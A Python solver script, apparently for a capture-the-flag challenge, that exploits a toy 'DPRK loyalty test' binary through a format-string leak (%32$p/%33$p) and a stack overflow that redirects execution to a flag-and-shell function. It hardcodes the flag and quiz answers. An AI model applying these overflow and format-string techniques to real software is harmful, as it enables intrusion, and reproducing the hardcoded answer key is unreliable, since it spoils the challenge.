#!/usr/bin/env python3
"""Solveur — 23x41 DPRK Loyalty Evaluation (format string + ret2grant)

Quiz C++ x86-64 : réponses sur la stack de `take_loyalty_test`
  Q1 = \"38\"
  Q2 = \"Mount Paektu\"
`operator>>` coupe sur l'espace → Q2 impossible en input « honnête ».

Chemin live fiable :
  échouer Q1 → `self_criticism_mode` (`printf(buf)` + `getline` 0xc8 dans frame 0x80)
  → overflow offset 0x88 → `grant_party_membership` @ 0x4011a6
  → FLAG + system(\"/bin/sh\")

Leak format-string (découverte des réponses) : `%32$p` / `%33$p` après mauvais Q1.

Usage:
  python3 juche-solve.py -q
  python3 juche-solve.py --check
  python3 juche-solve.py --leak
  python3 juche-solve.py --payload | stdbuf -o0 ./original/juche_loyalty_test
"""
from __future__ import annotations

import argparse
import os
import signal
import struct
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
BIN = ROOT / "original" / "juche_loyalty_test"

GRANT = 0x4011A6
RA_OFF = 0x88
FLAG = "FLAG{0x8A7_JUCHE_FORMAT_STRING_MASTERY}"
ANS1 = "38"
ANS2 = "Mount Paektu"


def overflow_payload() -> bytes:
    """Ligne 1 = mauvaise réponse Q1 ; ligne 2 = smash ret → grant."""
    return b"x\n" + b"A" * RA_OFF + struct.pack("<Q", GRANT) + b"\n"


def _run(args: list[str], inp: bytes, timeout: float = 1.0) -> str:
    p = subprocess.Popen(
        args,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        start_new_session=True,
    )
    try:
        out, _ = p.communicate(inp, timeout=timeout)
        return out.decode(errors="replace")
    except subprocess.TimeoutExpired:
        try:
            os.killpg(p.pid, signal.SIGKILL)
        except ProcessLookupError:
            pass
        try:
            out = p.communicate(timeout=0.3)[0] or b""
        except Exception:
            out = b""
        return out.decode(errors="replace")


def check_live() -> int:
    if not BIN.is_file():
        print(f"missing {BIN}", file=sys.stderr)
        return 1
    # stdbuf -o0 : cout entièrement bufferisé en pipe sinon le FLAG reste en buffer
    # quand system("/bin/sh") plante sur la stack corrompue.
    out = _run(["stdbuf", "-o0", "-e0", str(BIN)], overflow_payload(), timeout=1.0)
    ok = FLAG in out and "[GLORIOUS VICTORY]" in out
    print(out[out.find("[GLORIOUS") :] if "[GLORIOUS" in out else out[-500:])
    print("OK" if ok else "FAIL")
    return 0 if ok else 1


def leak_demo() -> int:
    """Montre %32$p / %33$p → Mount Pa / ektu + 38."""
    fmt = "%32$p.%33$p"
    out = _run([str(BIN)], f"no\n{fmt}\n".encode(), timeout=1.0)
    if "Self-criticism:" not in out:
        print("FAIL: pas de self-criticism", file=sys.stderr)
        return 1
    leak = out.split("Self-criticism:")[-1].split("[LOG]")[0].strip()
    print(f"format : {fmt}")
    print(f"leak   : {leak}")
    parts = leak.split(".")
    decoded = []
    for tok in parts:
        tok = tok.strip()
        if not tok.startswith("0x"):
            continue
        n = int(tok, 16)
        raw = n.to_bytes(8, "little")
        decoded.append("".join(chr(b) if 32 <= b < 127 else "." for b in raw))
    print(f"ascii  : {decoded}")
    blob = leak.lower().replace("0x", "")
    ok = "615020746e756f4d" in blob and "3833" in blob
    print("OK" if ok else "FAIL")
    return 0 if ok else 1


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("-q", action="store_true", help="flag seul")
    ap.add_argument("--answers", action="store_true", help="affiche Q1/Q2")
    ap.add_argument("--payload", action="store_true", help="payload overflow brut (stdin du binaire)")
    ap.add_argument("--payload-hex", action="store_true")
    ap.add_argument("--check", action="store_true", help="live overflow → flag (stdbuf -o0)")
    ap.add_argument("--leak", action="store_true", help="démo format-string %%32$p.%%33$p")
    args = ap.parse_args()

    if args.check:
        return check_live()
    if args.leak:
        return leak_demo()
    if args.payload:
        sys.stdout.buffer.write(overflow_payload())
        return 0
    if args.payload_hex:
        print(overflow_payload().hex())
        return 0
    if args.answers:
        print(f"Q1={ANS1}")
        print(f"Q2={ANS2}")
        return 0
    if args.q:
        print(FLAG)
        return 0

    print("=== 23x41 DPRK Loyalty Evaluation ===")
    print(f"flag     : {FLAG}")
    print(f"answers  : Q1={ANS1!r}  Q2={ANS2!r}")
    print(f"note     : cin>> coupe Q2 sur l'espace → ret2grant via criticism")
    print(f"grant    : {hex(GRANT)}  ra_off={hex(RA_OFF)}")
    print("check    : python3 tools/juche-solve.py --check")
    print("leak     : python3 tools/juche-solve.py --leak")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
